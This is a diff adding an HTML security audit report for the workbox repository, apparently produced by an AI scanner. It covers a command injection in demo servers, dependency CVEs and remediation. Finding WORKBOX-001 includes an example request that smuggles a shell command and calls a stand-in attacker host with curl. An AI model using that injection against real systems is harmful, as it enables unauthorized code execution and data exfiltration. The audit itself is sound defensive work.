@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Security Report — workbox</title>
+<style>
+  :root { --critical: #d63031; --high: #e17055; --medium: #fdcb6e; --low: #00b894; --info: #74b9ff; --bg: #0d1117; --surface: #161b22; --surface2: #21262d; --border: #30363d; --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; background: var(--bg); color: var(--text); line-height: 1.6; padding: 2rem; }
+  h1 { font-size: 1.8rem; color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: 0.75rem; margin-bottom: 1.5rem; }
+  h2 { font-size: 1.3rem; color: var(--text); margin: 2rem 0 1rem; border-left: 3px solid var(--accent); padding-left: 0.75rem; }
+  h4 { font-size: 0.9rem; color: var(--muted); text-transform: uppercase; margin: 1rem 0 0.3rem; }
+  a { color: var(--accent); }
+  .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-align: center; }
+  .card .num { font-size: 2rem; font-weight: 700; } .card .label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; }
+  .card.critical { border-color: var(--critical); } .card.critical .num { color: var(--critical); }
+  .card.high { border-color: var(--high); } .card.high .num { color: var(--high); }
+  .card.medium { border-color: var(--medium); } .card.medium .num { color: var(--medium); }
+  .card.low { border-color: var(--low); } .card.low .num { color: var(--low); }
+  .card.info .num { color: var(--info); }
+  .badge { display: inline-block; padding: 0.15rem 0.6rem; border-radius: 12px; font-size: 0.72rem; font-weight: 700; text-transform: uppercase; }
+  .badge-critical { background: var(--critical); color: #fff; } .badge-high { background: var(--high); color: #fff; }
+  .badge-medium { background: var(--medium); color: #1a1a1a; } .badge-low { background: var(--low); color: #fff; }
+  .badge-cve { background: #6c5ce7; color: #fff; } .badge-nc { background: var(--surface2); color: var(--muted); }
+  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 1.5rem 0; overflow: hidden; }
+  .finding-header { display: flex; align-items: center; gap: 0.75rem; padding: 0.9rem 1.2rem; background: var(--surface2); border-bottom: 1px solid var(--border); }
+  .finding-id { font-size: 0.78rem; color: var(--muted); font-family: monospace; }
+  .finding-title { font-weight: 600; font-size: 1rem; flex: 1; }
+  .finding-body { padding: 1.2rem; }
+  .finding-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1rem; font-size: 0.85rem; }
+  .finding.sev-critical { border-left: 4px solid var(--critical); } .finding.sev-high { border-left: 4px solid var(--high); }
+  .finding.sev-medium { border-left: 4px solid var(--medium); } .finding.sev-low { border-left: 4px solid var(--low); }
+  pre { background: #010409; border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.82rem; margin: 0.5rem 0; }
+  code { font-family: monospace; } p code { background: var(--surface2); padding: 0.1em 0.4em; border-radius: 4px; color: #f8c8c8; }
+  .table-wrap { overflow-x: auto; margin: 1rem 0; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  th { background: var(--surface2); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.72rem; padding: 0.6rem 0.9rem; text-align: left; border-bottom: 2px solid var(--border); }
+  td { padding: 0.55rem 0.9rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+  .unclaimed { color: var(--critical); font-weight: 700; } .shadow { color: var(--high); font-weight: 700; }
+  details { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 0.8rem 0; }
+  summary { padding: 0.8rem 1.2rem; cursor: pointer; font-weight: 600; font-size: 0.9rem; list-style: none; }
+  details > *:not(summary) { padding: 0 1.2rem 1.2rem; }
+  .report-header { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 1rem; margin-bottom: 2rem; }
+  .report-meta { font-size: 0.83rem; color: var(--muted); line-height: 1.8; } .report-meta strong { color: var(--text); }
+  .risk-banner { padding: 0.5rem 1.4rem; border-radius: 6px; font-weight: 700; font-size: 1.1rem; }
+  .risk-critical { background: var(--critical); color: #fff; } .risk-high { background: var(--high); color: #fff; }
+  .risk-medium { background: var(--medium); color: #1a1a1a; } .risk-low { background: var(--low); color: #fff; }
+  .section-empty { color: var(--muted); font-style: italic; padding: 1rem 0; }
+  .p0 { color: var(--critical); font-weight: 700; } .p1 { color: var(--high); font-weight: 700; } .p2 { color: var(--medium); font-weight: 700; }
+  footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid var(--border); font-size: 0.78rem; color: var(--muted); text-align: center; }
+</style>
+</head>
+<body>
+<h1>&#x1F6E1; Security Vulnerability Report</h1>
+<div class="report-header">
+  <div class="report-meta">
+    <strong>Repository:</strong> <a href="https://github.com/GoogleChrome/workbox">https://github.com/GoogleChrome/workbox</a><br>
+    <strong>Branch:</strong> v7 (HEAD: 1893b3f)<br>
+    <strong>Languages:</strong> TypeScript/JavaScript (Service Worker library, webpack plugin, Node.js build tools)<br>
+    <strong>Analysis Date:</strong> 2026-03-01<br>
+    <strong>Analyst:</strong> Claude Code Security Scanner
+  </div>
+  <div class="risk-banner risk-medium">MEDIUM RISK</div>
+</div>
+
+<h2>Executive Summary</h2>
+<div class="summary-grid">
+  <div class="card critical"><div class="num">0</div><div class="label">Critical</div></div>
+  <div class="card high"><div class="num">1</div><div class="label">High</div></div>
+  <div class="card medium"><div class="num">1</div><div class="label">Medium</div></div>
+  <div class="card low"><div class="num">1</div><div class="label">Low</div></div>
+  <div class="card info"><div class="num">5</div><div class="label">Dep CVEs</div></div>
+  <div class="card critical"><div class="num">0</div><div class="label">Dep Confusion</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">Secrets</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">CVE-Eligible</div></div>
+</div>
+<p style="margin:1rem 0;line-height:1.7">
+  Workbox is a suite of JavaScript service worker libraries (published to npm as <code>workbox-*</code> packages) plus build tools like <code>workbox-webpack-plugin</code>. The repository contains no server-side application code — the published library packages operate in the browser/service-worker context, not on a server. The most significant finding is a command injection vulnerability in Glitch demo server code (<code>demos/src/workbox-streams/server.js</code> and <code>demos/src/workbox-cacheable-response/server.js</code>) where a user-supplied <code>repo</code> query parameter is passed unsanitized to <code>execSync()</code>. These servers are confirmed deployed to Glitch.com as live demos. Exploitation requires knowledge of a <code>SECRET</code> environment variable, but the structural vulnerability is clearly present. The npm-published library packages themselves contain no server-side injection risks. The 77 npm advisory entries are dominated by devDependency build tools (lerna, rollup, mocha) that do not reach end-users. No hardcoded secrets were found.
+</p>
+
+<h2>Confirmed Vulnerabilities</h2>
+
+<!-- FINDING 1 -->
+<div class="finding sev-high">
+  <div class="finding-header">
+    <span class="finding-id">WORKBOX-001</span>
+    <span class="finding-title">Command Injection in Glitch Demo Servers via Unsanitized repo Parameter</span>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>Components:</strong> <code>demos/src/workbox-streams/server.js</code>, <code>demos/src/workbox-cacheable-response/server.js</code></span>
+      <span><strong>Deployed at:</strong> <a href="https://glitch.com/@philkrie/workbox-demos">glitch.com/@philkrie/workbox-demos</a></span>
+      <span><strong>Auth Required:</strong> Yes (SECRET env var must be known)</span>
+      <span><strong>CWE:</strong> CWE-78 (OS Command Injection)</span>
+    </div>
+    <h4>Description</h4>
+    <p>
+      Both demo server scripts contain a <code>/deploy</code> POST endpoint that is documented as "unrelated to the demo and used for maintenance." After checking a secret against <code>process.env.SECRET</code>, the endpoint takes a <code>repo</code> query parameter and passes it directly to <code>execSync()</code> in a shell command string via template literal interpolation. There is no sanitization, validation, or escaping of the <code>repoUrl</code> value. An attacker who knows the <code>SECRET</code> value (stored as a Glitch environment variable) can inject arbitrary shell commands by crafting a <code>repo</code> value containing semicolons, backticks, or <code>$()</code> subshell syntax.
+    </p>
+    <h4>Vulnerable Code</h4>
+    <pre><code>// demos/src/workbox-streams/server.js (identical pattern in workbox-cacheable-response)
+app.post('/deploy', (request, response) => {
+  if (request.query.secret !== process.env.SECRET) {
+    response.status(401).send();
+    return;
+  }
+
+  const repoUrl = request.query.repo;   // ← ATTACKER-CONTROLLED
+  execSync(
+    `git checkout -- ./ && git pull -X theirs ${repoUrl} ` +  // ← INJECTION SINK
+      `glitch && refresh && git branch -D glitch`,
+  );
+  response.status(200).send();
+});</code></pre>
+    <h4>Example Exploitation</h4>
+    <pre><code>POST https://workbox-streams.glitch.me/deploy?secret=&lt;KNOWN_SECRET&gt;&repo=x;curl+https://attacker.com/$(id);echo
+# → execSync runs: git checkout -- ./ && git pull -X theirs x;curl https://attacker.com/$(id);echo glitch...
+# → Arbitrary command execution on the Glitch container</code></pre>
+    <h4>Exploitability Gate</h4>
+    <p>
+      (1) Attacker-controlled: Yes — <code>request.query.repo</code> is unsanitized user input.<br>
+      (2) No sanitization: Confirmed — no escaping, validation, or allowlisting of repo URL format.<br>
+      (3) Reachable: Yes — the Glitch projects are publicly listed and the endpoint is HTTP-accessible.<br>
+      (4) Real impact: Remote code execution on the Glitch container hosting the demo; potential exposure of other Glitch env vars (API keys, etc.).<br>
+      (5) Not framework-mitigated: <code>execSync</code> with shell=true (default) interprets the full string through /bin/sh.
+    </p>
+    <h4>Remediation</h4>
+    <p>
+      Replace the template literal string concatenation with an array-based <code>execFileSync</code> call that separates the command from its arguments, preventing shell interpretation:
+      <br><code>execFileSync('git', ['pull', '-X', 'theirs', repoUrl, 'glitch']);</code><br>
+      Additionally, validate that <code>repoUrl</code> matches an expected git URL pattern before executing. The <code>refresh</code> command appearing in the same string also warrants review.
+    </p>
+  </div>
+</div>
+
+<!-- FINDING 2 -->
+<div class="finding sev-medium">
+  <div class="finding-header">
+    <span class="finding-id">WORKBOX-002</span>
+    <span class="finding-title">webpack buildHttp SSRF via allowedUris Bypass (Build-time)</span>
+    <span class="badge badge-medium">MEDIUM</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>Component:</strong> <code>workbox-webpack-plugin</code> (peerDependency: webpack)</span>
+      <span><strong>Advisory:</strong> webpack buildHttp allowedUris allow-list bypass via URL userinfo</span>
+      <span><strong>Severity:</strong> HIGH (npm) / MEDIUM here (build-time, requires attacker-controlled webpack config)</span>
+      <span><strong>CWE:</strong> CWE-918</span>
+    </div>
+    <h4>Description</h4>
+    <p>
+      The <code>workbox-webpack-plugin</code> package lists <code>webpack@^4.4.0 || ^5.91.0</code> as a peer dependency. Webpack 4/5 contains a vulnerability where the <code>buildHttp</code> feature's <code>allowedUris</code> allowlist can be bypassed by including userinfo in the URL (e.g., <code>http://allowed.com@evil.com/path</code>), enabling build-time SSRF. This only applies when a developer uses the <code>buildHttp</code> webpack configuration option with an allowlist — it does not affect the typical use of workbox-webpack-plugin for service worker generation.
+    </p>
+    <h4>Remediation</h4>
+    <p>Update the resolved webpack version to one that fixes this bypass. The <code>workbox-webpack-plugin</code> peerDep range <code>^5.91.0</code> should be updated to require a minimum version that includes the fix.</p>
+  </div>
+</div>
+
+<!-- FINDING 3 -->
+<div class="finding sev-low">
+  <div class="finding-header">
+    <span class="finding-id">WORKBOX-003</span>
+    <span class="finding-title">serialize-javascript XSS in Build Tool Chain (devDependency)</span>
+    <span class="badge badge-low">LOW</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>Component:</strong> <code>serialize-javascript</code> (transitive via terser-webpack-plugin)</span>
+      <span><strong>Advisory:</strong> Cross-site Scripting (XSS) in serialize-javascript</span>
+      <span><strong>Severity:</strong> HIGH (npm) / LOW here (devDependency build tool, not in published library)</span>
+      <span><strong>CWE:</strong> CWE-79</span>
+    </div>
+    <h4>Description</h4>
+    <p>
+      <code>serialize-javascript</code> contains an XSS vulnerability via inadequate escaping of certain characters in serialized output. It is a transitive dependency of the build toolchain (via <code>terser-webpack-plugin</code>). This vulnerability does not affect the published workbox library packages or their consumers — it only affects developers building the workbox library itself.
+    </p>
+    <h4>Remediation</h4>
+    <p>Update <code>terser-webpack-plugin</code> to a version that pulls in a fixed <code>serialize-javascript</code>.</p>
+  </div>
+</div>
+
+<h2>&#x1F4E6; Dependency Confusion</h2>
+<p class="section-empty">No dependency confusion vulnerabilities found. All workbox-* packages are properly published to npm under the correct scope/names. No internal-looking package names were identified as unregistered on the public npm registry.</p>
+
+<h2>Known Dependency CVEs</h2>
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr>
+      <th>Severity</th>
+      <th>Package</th>
+      <th>Vulnerability</th>
+      <th>Context</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td><code>webpack</code> (peerDep)</td>
+      <td>buildHttp allowedUris bypass — build-time SSRF</td>
+      <td>Build-time (workbox-webpack-plugin peerDep)</td>
+    </tr>
+    <tr>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td><code>rollup@^4.53.3</code></td>
+      <td>Arbitrary File Write via path traversal in Rollup 4</td>
+      <td>Build-time only (devDependency)</td>
+    </tr>
+    <tr>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td><code>serialize-javascript</code> (transitive)</td>
+      <td>XSS via inadequate character escaping</td>
+      <td>Build-time only (via terser-webpack-plugin)</td>
+    </tr>
+    <tr>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td><code>taffydb</code> (transitive)</td>
+      <td>TaffyDB allows access to any data items in the DB</td>
+      <td>Build-time only (via jsdoc tool)</td>
+    </tr>
+    <tr>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td><code>tar</code> (transitive)</td>
+      <td>Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS</td>
+      <td>Build-time only (devDependency toolchain)</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h2>&#x1F511; Hardcoded Secrets</h2>
+<p class="section-empty">No hardcoded secrets found. No API keys, tokens, or credentials were identified in the source code. The demo servers reference <code>process.env.SECRET</code> which is stored as a Glitch environment variable, not committed to the repository.</p>
+
+<h2>Patterns Investigated but Excluded</h2>
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr>
+      <th>Pattern Found</th>
+      <th>Reason Excluded</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>readFileSync(this.config.swSrc)</code> in workbox-webpack-plugin</td>
+      <td><code>swSrc</code> is a developer-provided webpack configuration option, not HTTP user input. Path traversal would require a malicious webpack config, which is developer-controlled. Not exploitable by external attackers.</td>
+    </tr>
+    <tr>
+      <td>77 npm audit vulnerabilities (devDependencies)</td>
+      <td>The large majority of vulnerabilities are in the monorepo build toolchain (lerna, gulp, mocha, rollup) used only during development and CI — not in the published workbox library packages consumed by end-users. The npm-published workbox packages have no known runtime vulnerabilities.</td>
+    </tr>
+    <tr>
+      <td>CI/CD workflows (pull-request.yml, scorecards-analysis.yml)</td>
+      <td>Both workflows use <code>pull_request</code> (not <code>pull_request_target</code>). No untrusted context expressions are interpolated into <code>run:</code> steps. Scorecards workflow is scoped to push to main branch with read-only permissions.</td>
+    </tr>
+    <tr>
+      <td>Service worker library fetch() usage</td>
+      <td>Workbox library packages intercept existing browser fetch() requests — they do not independently initiate new requests to attacker-controlled URLs. The URLs processed are determined by the host page's developer configuration (caching strategies, precache manifests), not by end-user input.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Remediation Priority</h2>
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr>
+      <th>Priority</th>
+      <th>Finding</th>
+      <th>Effort</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><span class="p1">P1 — High</span></td>
+      <td>WORKBOX-001: Replace shell-interpolated <code>execSync</code> with array-based <code>execFileSync</code> in both demo servers; add URL format validation for <code>repoUrl</code></td>
+      <td>Low (5–10 lines of code change; requires Glitch redeployment)</td>
+    </tr>
+    <tr>
+      <td><span class="p2">P2 — Medium</span></td>
+      <td>WORKBOX-002: Update minimum webpack peer dependency version in workbox-webpack-plugin to one that resolves the buildHttp SSRF bypass</td>
+      <td>Low (version bump in peerDependencies)</td>
+    </tr>
+    <tr>
+      <td>P3 — Low</td>
+      <td>WORKBOX-003: Update terser-webpack-plugin to resolve serialize-javascript XSS in devDependency chain</td>
+      <td>Trivial</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<details><summary>Methodology</summary>
+<p>Multi-phase analysis on commit <code>1893b3f</code> (v7 branch, depth=50). Phase 1: Secret detection — no hardcoded credentials found. Phase 2: Dependency analysis via <code>npm audit --json</code>; 77 advisory entries classified by devDependency vs. published library context. Phase 2.5: npm registry checked for workbox-* packages; all legitimately published. Phase 3: Static analysis for XSS, eval, SSRF, command injection. Command injection found in Glitch demo servers. Phase 4: Auth review — demo server secret check noted but insufficient defense-in-depth. Phase 6: Both workflow files reviewed; no script injection or pull_request_target misuse. Phase 9: 5-gate exploitability test applied — demo server RCE is exploitable conditioned on knowing the Glitch SECRET; build-tool vulnerabilities excluded from confirmed findings.</p>
+</details>
+
+<footer>Generated by Claude Code Security Scanner &mdash; 2026-03-01 &mdash; For authorized use only.</footer>
+</body>
+</html>
